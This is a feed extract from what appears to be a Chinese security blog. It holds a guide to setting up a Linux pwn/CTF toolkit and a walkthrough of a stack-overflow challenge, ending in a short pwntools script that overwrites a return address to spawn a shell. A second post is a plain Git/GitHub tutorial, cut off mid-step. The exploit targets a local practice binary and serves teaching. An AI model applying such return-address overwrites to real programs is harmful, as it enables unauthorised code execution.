    <content type="html"><![CDATA[<blockquote><p>往往我们做pwn题，都是拿到可执行文件(elf)其依赖文件libc.so,工欲善其事必先利其器，利用好的工具，可以事半功倍。在此列出自己做pwn题的虚拟机ubuntu配置，更加期待WSL2上线后，使用docker部署pwn环境做题</p></blockquote><p>主要工具：<br><code>vim</code> ： 安装插件，为后续编写exploit<br><code>peda</code> ：gdb插件，调试神器，谁用谁知道<br><code>pwngdb、gef</code> ：同上<br><code>pwndbg</code>：GitHub上的一个项目,用于GDB的辅助增强<br><code>pwntools</code>：常见的pwn漏洞堆溢出、栈溢出、use after free、格式化字符串、命令注入以及竞态(常见于多线程)等程序漏洞，在程序漏洞利用常利用python脚本来编写exploit<br>Capstone、Binutils…<br><code>rop工具</code> :ROPgadget、one_gadget，这两个都很好用，one_gadget主要是用来寻找libc文件中的一些shell地址的、ROPgadget则主要是用来构建rop链的，非常实用<br><code>LibcSearcher</code>:用来泄露libc库中函数的偏移的库</p><a id="more"></a><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO- http<span class="variable">s:</span>//raw.github.<span class="keyword">com</span>/ma6174/<span class="keyword">vim</span>/master/setup.<span class="keyword">sh</span> | <span class="keyword">sh</span> -<span class="keyword">x</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/ma6174/vim" target="_blank" rel="noopener">详细配置地址</a></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558516980991.png" alt></p><h3 id="安装Capstone（反编译框架）"><a href="#安装Capstone（反编译框架）" class="headerlink" title="安装Capstone（反编译框架）"></a>安装Capstone（反编译框架）</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~<span class="symbol">$</span> git clone https:<span class="comment">//github.com/aquynh/capstone</span></span><br><span class="line">~<span class="symbol">$</span> cd capstone</span><br><span class="line">~<span class="symbol">$</span> make</span><br><span class="line">~<span class="symbol">$</span> sudo make install</span><br></pre></td></tr></table></figure><h3 id="安装Binutils（二进制工具集）"><a href="#安装Binutils（二进制工具集）" class="headerlink" title="安装Binutils（二进制工具集）"></a>安装Binutils（二进制工具集）</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/Gallopsled/pwntools-binutils</span><br><span class="line">sudo apt-<span class="built_in">get</span> install software-properties-common</span><br><span class="line">sudo apt-<span class="built_in">add</span>-repository <span class="keyword">pp</span><span class="variable">a:pwntools</span>/binutils</span><br><span class="line">sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install binutils-arm-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="第三方库"><a href="#第三方库" class="headerlink" title="第三方库"></a>第三方库</h3><p>在逆向和溢出程序交互时，用得最多的几个第三方库先装好：<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pip <span class="keyword">install</span> pwntools</span><br><span class="line">sudo pip <span class="keyword">install</span> zio</span><br><span class="line">sudo pip <span class="keyword">install</span> pwn</span><br></pre></td></tr></table></figure></p><p>在配置python-pip的过程中遇到了点问题<br>升级pip==19.1.1后，出现如下报错：<br><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558514986729.png" alt></p><p>可行的解决方案是修改报错行的代码</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pip._internal <span class="keyword">import</span> main</span><br></pre></td></tr></table></figure><p>ssl验证问题</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　rm -rf /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">python2</span>.7/<span class="title">dist</span>-<span class="title">packages</span>/<span class="title">OpenSSL</span></span></span><br><span class="line">　rm -rf /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">python2</span>.7/<span class="title">dist</span>-<span class="title">packages</span>/<span class="title">pyOpenSSL</span>-0.15.1.<span class="title">egg</span>-<span class="title">info</span></span></span><br><span class="line">　sudo pip install pyopenssl</span><br></pre></td></tr></table></figure><p>出现checksec无法使用的问题</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install git+http<span class="variable">s:</span>//github.<span class="keyword">com</span>/arthaud/<span class="keyword">python3</span>-pwntools.git</span><br></pre></td></tr></table></figure><h3 id="安装gdb工具"><a href="#安装gdb工具" class="headerlink" title="安装gdb工具"></a>安装gdb工具</h3><p>在调试时有时候需要不同功能，在gdb下需要安装两个工具pwndbg和peda，可惜这两个不兼容</p><p>pwndbg在调试堆的数据结构时候很方便</p><p>peda在查找字符串等功能时方便</p><h4 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="string">//github.com/longld/peda.git</span> ~<span class="string">/peda</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~<span class="string">/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"DONE! debug your program with gdb and enjoy"</span></span><br></pre></td></tr></table></figure><h4 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/pwndbg/pwndbg</span><br><span class="line"><span class="keyword">cd</span> pwndbg</span><br><span class="line">./setup.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><h4 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~/</span><br><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/scwuaptx/Pwngdb.git </span><br><span class="line"><span class="keyword">cp</span> ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure><h4 id="gef"><a href="#gef" class="headerlink" title="gef"></a>gef</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#via</span> the install script</span><br><span class="line">$ wget -<span class="selector-tag">q</span> -O- https:<span class="comment">//github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span></span><br><span class="line">#manually</span><br><span class="line">$ wget -O ~/<span class="selector-class">.gdbinit-gef</span><span class="selector-class">.py</span> -<span class="selector-tag">q</span> https:<span class="comment">//github.com/hugsy/gef/raw/master/gef.py</span></span><br><span class="line">$ echo source ~/<span class="selector-class">.gdbinit-gef</span><span class="selector-class">.py</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>我们通过修改<code>gdbinit</code>来切换想使用的插件<br><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558543947512.png" alt></p><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a></p><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get <span class="keyword">install</span> ruby</span><br><span class="line">apt-<span class="keyword">get</span> <span class="keyword">install</span> gem</span><br><span class="line">sudo gem <span class="keyword">install</span> one_gadget</span><br></pre></td></tr></table></figure><h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/lieanu/libc.git</span><br><span class="line"><span class="keyword">cd</span> libc</span><br><span class="line">git submodule <span class="keyword">update</span> --init --recursive</span><br><span class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> develop</span><br></pre></td></tr></table></figure><h2 id="实例-Pwn分析之栈溢出"><a href="#实例-Pwn分析之栈溢出" class="headerlink" title="实例:Pwn分析之栈溢出"></a>实例:Pwn分析之栈溢出</h2><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558346295370.png" alt="解题思路"></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h3><p>反编译得到C伪代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数调用vulnerable()函数</p><p>vulnerable()函数逆向结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vulnerable()函数中调用了gets()和puts()函数，而程序的逻辑只运行main函数和vulnerable函数</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558346325757.png" alt="所有函数"></p><p>vulnerable函数功能：输入字符串，输出字符串<br>程序中主要函数有<br>内置函数：<code>gets</code>、<code>puts</code>、<code>system</code><br>自定义函数：<code>main</code>、<code>success</code></p><h3 id="0X02"><a href="#0X02" class="headerlink" title="0X02"></a>0X02</h3><p>通过C伪代码最终得到的C代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; </span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>);</span><br><span class="line">   system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line"> gets(s);</span><br><span class="line"> <span class="built_in">puts</span>(s);</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"> vulnerable();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>gets() 是一个危险函数，因为它不检查输入字符串的长度，而是以回车来判断是否输入结束，所以很容易导致栈溢出</p><h3 id="0X03"><a href="#0X03" class="headerlink" title="0X03"></a>0X03</h3><p>查看程序的保护机制：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558349234163.png" alt="check"></p><p>输入s的值溢出到返回地址，将返回地址替换成success函数的起始地址</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558351987182.png" alt></p><p>EBP与EBP的距离14H，而栈中的EBP占栈内存4H，所以要覆盖到放回地址需要18H</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558351057170.png" alt></p><p>编写脚本如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process('./Ezreal')</span><br><span class="line">success_addr = 0x080491A2</span><br><span class="line"></span><br><span class="line">payload = 'a' * 0x18 + p32(success_addr)</span><br><span class="line">print p32(success_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>利用脚本后的栈结构如下：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558351356590.png" alt></p><p>运行脚本，成功拿到shell：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558359406735.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;往往我们做pwn题，都是拿到可执行文件(elf)其依赖文件libc.so,工欲善其事必先利其器，利用好的工具，可以事半功倍。在此列出自己做pwn题的虚拟机ubuntu配置，更加期待WSL2上线后，使用docker部署pwn环境做题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;主要工具：&lt;br&gt;&lt;code&gt;vim&lt;/code&gt; ： 安装插件，为后续编写exploit&lt;br&gt;&lt;code&gt;peda&lt;/code&gt; ：gdb插件，调试神器，谁用谁知道&lt;br&gt;&lt;code&gt;pwngdb、gef&lt;/code&gt; ：同上&lt;br&gt;&lt;code&gt;pwndbg&lt;/code&gt;：GitHub上的一个项目,用于GDB的辅助增强&lt;br&gt;&lt;code&gt;pwntools&lt;/code&gt;：常见的pwn漏洞堆溢出、栈溢出、use after free、格式化字符串、命令注入以及竞态(常见于多线程)等程序漏洞，在程序漏洞利用常利用python脚本来编写exploit&lt;br&gt;Capstone、Binutils…&lt;br&gt;&lt;code&gt;rop工具&lt;/code&gt; :ROPgadget、one_gadget，这两个都很好用，one_gadget主要是用来寻找libc文件中的一些shell地址的、ROPgadget则主要是用来构建rop链的，非常实用&lt;br&gt;&lt;code&gt;LibcSearcher&lt;/code&gt;:用来泄露libc库中函数的偏移的库&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://qymua.com/categories/Pwn/"/>
    
    
      <category term="ubuntu" scheme="http://qymua.com/tags/ubuntu/"/>
    
      <category term="linux" scheme="http://qymua.com/tags/linux/"/>
    
      <category term="pwn" scheme="http://qymua.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Git for github 使用笔记</title>
    <link href="http://qymua.com/2019/04/24/Git-for-github-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://qymua.com/2019/04/24/Git-for-github-使用笔记/</id>
    <published>2019-04-24T09:51:52.000Z</published>
    <updated>2019-08-10T13:03:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>作为一个白帽子，使用github的唯一目的是记录自己的研究项目，存放学习笔记，备份资料等等。对协同开发的需求不大，简单使用Git的几个命令就可以上传本地文件到远程服务器，很多人说很繁琐，喜欢使用GUI版本的github for Desktop,那么这就看个人喜好了~接下来的内容仅适合同我情况差不多的人阅读! </p></blockquote><p>详细的学习教程–&gt;<a href="http://www.runoob.com/git/git-tutorial.html" target="_blank" rel="noopener">菜鸟教程 for Git</a> </p><a id="more"></a><h2 id="Git和github的关系"><a href="#Git和github的关系" class="headerlink" title="Git和github的关系"></a>Git和github的关系</h2><p><code>git</code>: 是分布式版本控制工具（Version control）,它可在本地建立仓库,你写的代码的各个版本都可以存着 ;</p><p><code>github</code>: 是一个面向开源及私有软件项目的托管平台，相当于网上仓库,你写的代码的各个版本都可以存着;</p><p><code>历史渊源</code>：Git比GitHub出生的早。事件回到2005年，有个公司不允许linux系统继续免费使用它们的版本控制软件了，然后linux系统创始人Torvalds一气之下花了10天时间创造了Git（第一个版本），并且开源给所有人免费试用。3年后，Tom Preston使用Git作为版本控制软件创建了<a href="http://Github.com" target="_blank" rel="noopener">http://Github.com</a> ，一个专门托管代码并且可以实现版本控制的网站。Tom之所以把网站叫做Github，是因为其核心部分版本控制是用Git来处理的。但是 为什么有人回复调侃Github是全球最大男性交友网站呢？那是因为Github的注册用户大都是男生，而且彼此之间可以相互关注（类似于微博）</p><h2 id="Git概览"><a href="#Git概览" class="headerlink" title="Git概览"></a>Git概览</h2><p>所有命令前都要加 <code>git</code>，如表中的<code>init</code>是指 <code>git init</code>。<br> 点击命令可直接跳转至本文第一次使用的地方。<br><br>以下命令都在命令行里执行。</p><h3 id="1、个人本地使用"><a href="#1、个人本地使用" class="headerlink" title="1、个人本地使用"></a>1、个人本地使用</h3><table><thead><tr><th style="text-align:center">行为</th><th style="text-align:center">命令</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:center">初始化</td><td style="text-align:center">init</td><td style="text-align:left">在本地的当前目录里初始化git仓库</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">clone [url]</td><td style="text-align:left">从网络上某个地址拷贝仓库(repository)到本地</td></tr><tr><td style="text-align:center">查看当前状态</td><td style="text-align:center">status</td><td style="text-align:left">查看当前仓库的状态。</td></tr><tr><td style="text-align:center">查看不同</td><td style="text-align:center">diff</td><td style="text-align:left">查看当前状态和最新的commit之间不同的地方</td></tr><tr><td style="text-align:center">添加文件</td><td style="text-align:center">add -A</td><td style="text-align:left">这算是相当通用的了。在commit之前要先add</td></tr><tr><td style="text-align:center">提交</td><td style="text-align:center">commit -m “提交信息”</td><td style="text-align:left">提交信息最好能体现更改了什么</td></tr><tr><td style="text-align:center">查看提交记录</td><td style="text-align:center">log</td><td style="text-align:left">查看当前版本及之前的commit记录</td></tr></tbody></table><h3 id="2、个人使用远程仓库"><a href="#2、个人使用远程仓库" class="headerlink" title="2、个人使用远程仓库"></a>2、个人使用远程仓库</h3><table><thead><tr><th style="text-align:center">行为</th><th style="text-align:center">命令</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:center">设置用户名</td><td style="text-align:center">config –global user.name “你的用户名”</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">设置邮箱</td><td style="text-align:center">config –global user.email “你的邮箱”</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">生成ssh key</td><td style="text-align:center">ssh-keygen -t rsa -C “你的邮箱”</td><td style="text-align:left">这条命令前面不用加git</td></tr><tr><td style="text-align:center">添加远程仓库</td><td style="text-align:center">remote add origin 你复制的地址</td><td style="text-align:left">设置origin</td></tr><tr><td style="text-align:center">上传并指定默认</td><td style="text-align:center">push -u origin master</td><td style="text-align:left">指定默认主机，以后push默认上传到origin上</td></tr><tr><td style="text-align:center">提交到远程仓库</td><td style="text-align:center">push</td><td style="text-align:left">将当前分支增加的commit提交到远程仓库</td></tr><tr><td style="text-align:center">从远程仓库同步</td><td style="text-align:center">pull</td><td style="text-align:left">获取远程仓库的commit</td></tr></tbody></table><p>可以使用一张图直观地看出以上主要命令对仓库的影响</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dspyxgk9j314a0qxjvu.jpg" alt></p><p>图片引用自：<a href="http://blog.podrezo.com/git-introduction-for-cvssvntfs-users/" target="_blank" rel="noopener">Git introduction for CVS/SVN/TFS users</a></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dsqvakjrj30ju06smxz.jpg" alt></p><p>图片引用自：<a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/0013745374151782eb658c5a5ca454eaa451661275886c6000" target="_blank" rel="noopener">工作区和暂存区 - 廖雪峰的官方网站</a> （做了点修改）</p><p>对照查看两张图：</p><blockquote><p>workspace 即工作区，逻辑上是本地计算机，还没添加到repository的状态；<br>staging 即版本库中的stage，是暂存区。修改已经添加进repository，但还没有作为commit提交，类似于缓存；<br>Local repository 即版本库中master那个地方。到这一步才算是成功生成一个新版本；<br>Remote repository 则是远程仓库。用来将本地仓库上传到网络，可以用于备份、共享、合作。本文将使用Github作为远程仓库的例子。</p></blockquote><h2 id="Git-安装"><a href="#Git-安装" class="headerlink" title="Git 安装"></a>Git 安装</h2><h3 id="Git-for-windows"><a href="#Git-for-windows" class="headerlink" title="Git for windows"></a>Git for windows</h3><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dss4kiwyj305v05u3yw.jpg" alt></p><p> 安装包可以到<a href="https://git-for-windows.github.io/" target="_blank" rel="noopener">官方网站</a>下载，或者在<a href="https://github.com/git-for-windows/git/releases" target="_blank" rel="noopener">github</a>下载。如果下载不下来，可以把链接复制下来用迅雷下载。如果用迅雷下载不放心，在下载完后去在github下载的那个地方查看SHA-256值，并和下载的文件对比，如果值一样就可以放心使用。<br><br> 安装的时候一路点击<code>Next</code>就行了。<br><br> 刚安装完打开后，窗口比较小。如果不太习惯，可以把它改大一些。<br><br> 1、首先移到窗口右下角边缘，出现箭头后把窗口拉大。<br> 2、点击窗口顶部左边的图标 -&gt; Options… -&gt; Window -&gt; Current size -&gt; OK<br>     这样以后打开窗口都会是调整后的大小。</p><blockquote><p>Git for Windows从<a href="https://github.com/git-for-windows/git/releases/tag/v2.8.0.windows.1" target="_blank" rel="noopener">2.8.0</a>版本开始，默认添加环境变量，所以环境变量部分就不用再手动配置了。</p></blockquote><h3 id="Git-for-Linux"><a href="#Git-for-Linux" class="headerlink" title="Git for Linux"></a>Git for Linux</h3><p>Git 的工作需要调用 curl，zlib，openssl，expat，libiconv 等库的代码，所以需要先安装这些依赖工具。</p><p>在有 yum 的系统上（比如 Fedora）或者有 apt-get 的系统上（比如 Debian 体系），可以用下面的命令安装：</p><p>各 Linux 系统可以使用其安装包管理工具（apt-get、yum 等）进行安装：</p><p><code>Debian/Ubuntu</code> Git 安装命令为：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ apt-<span class="built_in">get</span> install libcurl4-gnutls-<span class="built_in">dev</span> libexpat1-<span class="built_in">dev</span> gettext \</span><br><span class="line">  libz-<span class="built_in">dev</span> libssl-<span class="built_in">dev</span></span><br><span class="line"></span><br><span class="line">$ apt-<span class="built_in">get</span> install git</span><br><span class="line"></span><br><span class="line">$ git --version</span><br><span class="line">git version <span class="number">1.8</span><span class="number">.1</span><span class="number">.2</span></span><br></pre></td></tr></table></figure><h3 id="用户信息配置"><a href="#用户信息配置" class="headerlink" title="用户信息配置"></a>用户信息配置</h3><p>配置个人的用户名称和电子邮件地址：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git<span class="built_in"> config </span>--global user.name <span class="string">"Qymua"</span></span><br><span class="line">$ git<span class="built_in"> config </span>--global user.email <span class="string">"test@Qymua.com"</span></span><br></pre></td></tr></table></figure><p>如果用了 <strong>–global</strong> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。</p><p>如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 –global 选项重新配置即可，新的设定保存在当前项目的 .git/config 文件里。</p><h2 id="Git-for-github"><a href="#Git-for-github" class="headerlink" title="Git for github"></a>Git for github</h2><blockquote><p>到这里表示已经可以开始使用Git上传项目到github了</p></blockquote><h3 id="添加ssh-key"><a href="#添加ssh-key" class="headerlink" title="添加ssh key"></a>添加ssh key</h3><p>由于你的本地 Git 仓库和 GitHub 仓库之间的传输是通过SSH加密的，所以我们需要配置验证信息：</p><p>使用以下命令生成 SSH Key：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span></span><br></pre></td></tr></table></figure><p>后面的<a href="mailto:*your_email@youremail.com" target="_blank" rel="noopener">*your_email@youremail.com</a>*改为你在 Github 上注册的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在 ~/ 下生成 .ssh 文件夹，进去，打开 <strong>id_rsa.pub</strong>，复制里面的 <strong>key</strong>。</p><p>回到 github 上，进入 Account =&gt; Settings（账户配置）。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dtfi2xtzj30gn08st9f.jpg" alt></p><p>左边选择 <strong>SSH and GPG keys</strong>，然后点击 <strong>New SSH key</strong> 按钮,title 设置标题，可以随便填，粘贴在你电脑上生成的 key。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dtfz7z8dj30kr0djaaw.jpg" alt></p><p>添加成功后为了验证是否成功，输入以下命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi tianqixin! You<span class="symbol">'ve</span> successfully authenticated, but GitHub does <span class="keyword">not</span> provide shell <span class="keyword">access</span>.</span><br></pre></td></tr></table></figure><h3 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h3><p>这里不再说明如何创建了，只介绍下相应选项的用途</p><p>Repository name: 仓库名称</p><p>Description(可选): 仓库描述介绍</p><p>Public, Private : 仓库权限（公开共享，私有或指定合作者）</p><p>Initialize this repository with a README: 添加一个README.md</p><p>gitignore: 不需要进行版本管理的仓库类型，对应生成文件.gitignore</p><p>license: 证书类型，对应生成文件LICENSE<br>​</p><h3 id="开始上传"><a href="#开始上传" class="headerlink" title="开始上传"></a>开始上传</h3><p> 1、在本地创建一个版本库（即文件夹），通过git init把它变成Git仓库；</p><p> 2、把项目复制到这个文件夹里面，再通过<code>git add .</code>把项目添加到仓库；</p><p> 3、再通过git commit -m “注释内容”把项目提交到仓库；</p><p> 4、通过git remote add origin <a href="https://github.com/用户名/项目名.git" target="_blank" rel="noopener">https://github.com/用户名/项目名.git</a> 将本地仓库和远程仓库进行关联；</p><p> 5、最后通过git push -u origin master把本地仓库的项目推送到远程仓库（也就是Github）上；</p><p> <em>由于新建的远程仓库是空的，所以要加上-u这个参数，等远程仓库里面有了内容之后，下次再从本地库上传内容的时候只需下面这样就可以了：</em></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">push</span> <span class="built_in">origin</span> master</span><br></pre></td></tr></table></figure><p>（若新建远程仓库的时候自动创建了README文件会报错，解决办法看下面）。</p><p> 这是由于你新创建的那个仓库里面的README文件不在本地仓库目录中，这时我们可以通过以下命令先将内容合并以下：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull <span class="comment">--rebase origin master</span></span><br></pre></td></tr></table></figure><h3 id="工作区迁移"><a href="#工作区迁移" class="headerlink" title="工作区迁移"></a>工作区迁移</h3><p>1、在新环境下配置好Git；</p><p>2、通过git init把它变成Git仓库；</p><p>3、git clone [url] 克隆仓库到本地；</p><p>4、git add . 添加项目到仓库（缓存区）；</p><p>5、通过git remote add origin <a href="https://github.com/用户名/项目名.git" target="_blank" rel="noopener">https://github.com/用户名/项目名.git</a> 